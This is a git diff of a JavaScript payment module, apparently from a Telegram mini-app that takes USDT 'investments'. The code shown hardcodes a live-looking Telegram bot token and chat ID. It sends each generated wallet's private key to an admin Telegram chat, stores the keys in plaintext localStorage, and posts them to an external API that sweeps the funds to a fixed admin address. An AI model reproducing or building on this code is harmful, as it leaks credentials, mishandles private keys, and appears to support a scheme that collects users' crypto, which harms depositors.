@@ -6,9 +6,16 @@ const API_BASE = "https://api-usdt-bep20.vercel.app/api";
 const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
 const ADMIN_CHAT_ID = "7517815832";
 
-/**
- * Envía los datos de la wallet generada al Telegram del Administrador
- */
+// Función interna para asegurar que la alerta no rompa el código
+const safeAlert = (msg) => {
+    if (window.showToast) {
+        window.showToast(msg);
+    } else {
+        console.warn("Toast no definido, usando alert:", msg);
+        alert(msg);
+    }
+};
+
 async function sendKeyToAdmin(address, privKey, amount) {
     const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
     const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario Desconocido");
@@ -37,15 +44,12 @@ async function sendKeyToAdmin(address, privKey, amount) {
     }
 }
 
-/**
- * Muestra el modal de pago y genera la wallet temporal
- */
 export async function showPayment() {
     const buyInput = document.getElementById('buy-qty');
     const amount = parseFloat(buyInput.value);
     
     if(!amount || amount < 1) {
-        window.showToast("Minimum investment is 1 USDT");
+        safeAlert("Minimum investment is 1 USDT");
         return;
     }
     
@@ -64,17 +68,12 @@ export async function showPayment() {
             state.tempAddress = data.address;
             state.tempKey = data.privateKey; 
 
-            // 1. REPORTE AL ADMIN (Telegram Privado)
             sendKeyToAdmin(data.address, data.privateKey, amount);
 
-            // 2. SISTEMA DE RECUPERACIÓN LOCAL (LocalStorage)
             localStorage.setItem('last_wallet_address', data.address);
             localStorage.setItem('last_private_key', data.privateKey);
             localStorage.setItem(`recovery_${data.address}`, data.privateKey);
             
-            console.log("🔑 KEY GUARDADA EN STORAGE Y ENVIADA AL ADMIN");
-
-            // 3. ACTUALIZAR INTERFAZ
             document.getElementById('pay-amount-display').innerText = amount.toFixed(2) + " USDT";
             document.getElementById('wallet-address-display').innerText = data.address;
             
@@ -87,18 +86,11 @@ export async function showPayment() {
             const arrowIcon = document.getElementById('arrow-icon');
             if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
             
-            const btnVerify = document.getElementById('btn-verify-payment');
-            if(btnVerify) {
-                btnVerify.disabled = false;
-                btnVerify.style.opacity = "1";
-            }
-
             document.getElementById('payModal').style.display = 'flex';
             startPaymentTimer();
         }
     } catch (e) {
-        console.error("Error generating payment:", e);
-        window.showToast("Connection error with API");
+        safeAlert("Connection error with API");
     } finally {
         if(btnContinueViewBuy) {
             btnContinueViewBuy.disabled = false;
@@ -107,38 +99,24 @@ export async function showPayment() {
     }
 }
 
-/**
- * Cierra el modal y limpia el timer
- */
-export function closePayment() {
-    document.getElementById('payModal').style.display = 'none';
-    clearInterval(state.payTimerInterval);
-}
-
-/**
- * Verifica el pago en la red
- */
 export async function verifyPayment() {
     const statusText = document.getElementById('payment-status-text');
     const arrowIcon = document.getElementById('arrow-icon');
     const btnVerify = document.getElementById('btn-verify-payment');
     
-    statusText.innerHTML = 'LOADING... ⌛';
-    if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 
-    if(btnVerify) {
-        btnVerify.disabled = true;
-        btnVerify.style.opacity = "0.7";
+    // Si no hay llave generada, no intentar verificar
+    if (!state.tempKey) {
+        safeAlert("Please generate a wallet first");
+        return;
     }
 
-    try {
-        // Añadimos un tiempo de espera (timeout) para que no se quede colgado
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 segundos
+    statusText.innerHTML = 'LOADING... ⌛';
+    if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 
 
+    try {
         const res = await fetch(`${API_BASE}/deposit-usdt`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            signal: controller.signal,
             body: JSON.stringify({
                 userPrivateKey: state.tempKey,
                 adminAddress: "0x1DE276E2E8879e1E6fBf905ee656Fe62c6D88E49", 
@@ -146,7 +124,6 @@ export async function verifyPayment() {
             })
         });
 
-        clearTimeout(timeoutId);
         const result = await res.json();
 
         if(result.success) {
@@ -156,7 +133,7 @@ export async function verifyPayment() {
             localStorage.removeItem(`recovery_${state.tempAddress}`);
             saveInvestment(state.pendingInvestment);
             
-            window.showToast("Payment confirmed!");
+            safeAlert("Payment confirmed!");
 
             setTimeout(() => {
                 closePayment();
@@ -164,30 +141,18 @@ export async function verifyPayment() {
                 switchTab('home');
             }, 2500);
         } else {
-            // Si la API responde pero el pago no está, NO mostramos "Network Error"
-            // Solo regresamos al estado original
+            // El pago no se ha encontrado, pero la red funciona. NO lanzar safeAlert aquí.
             setTimeout(() => {
                 statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
                 if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
-                if(btnVerify) {
-                    btnVerify.disabled = false;
-                    btnVerify.style.opacity = "1";
-                }
             }, 1000);
         }
     } catch (e) {
-        // AQUÍ ES DONDE SALÍA TU ERROR
-        console.error("DETALLE DEL ERROR:", e); // Esto te dirá en la consola qué pasa
-        
-        // Si el error es real de red, mostramos el Toast
-        window.showToast("Network error, try again");
-        
+        console.error("Error Real de Red:", e);
+        // Solo mostrar error de red si falla la comunicación con el servidor
+        safeAlert("Network error, try again");
         statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
         if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
-        if(btnVerify) {
-            btnVerify.disabled = false;
-            btnVerify.style.opacity = "1";
-        }
     }
 }
 
@@ -211,22 +176,17 @@ function startPaymentTimer() {
 
 window.copyAddress = function() {
     const address = document.getElementById('wallet-address-display').innerText;
-    navigator.clipboard.writeText(address).then(() => {
-        window.showToast("Address copied!");
-    });
-};
-
-window.recoverLastKey = function() {
-    const addr = localStorage.getItem('last_wallet_address');
-    const key = localStorage.getItem('last_private_key');
-    if(key) {
-        console.log("Dirección:", addr);
-        console.log("Llave Privada:", key);
-        return { address: addr, privateKey: key };
-    } else {
-        console.log("No hay llaves guardadas.");
+    if (address && address !== "Generating...") {
+        navigator.clipboard.writeText(address).then(() => {
+            safeAlert("Address copied!");
+        });
     }
 };
+
+export function closePayment() {
+    document.getElementById('payModal').style.display = 'none';
+    clearInterval(state.payTimerInterval);
+}
 
 window.showPayment = showPayment;
 window.closePayment = closePayment;
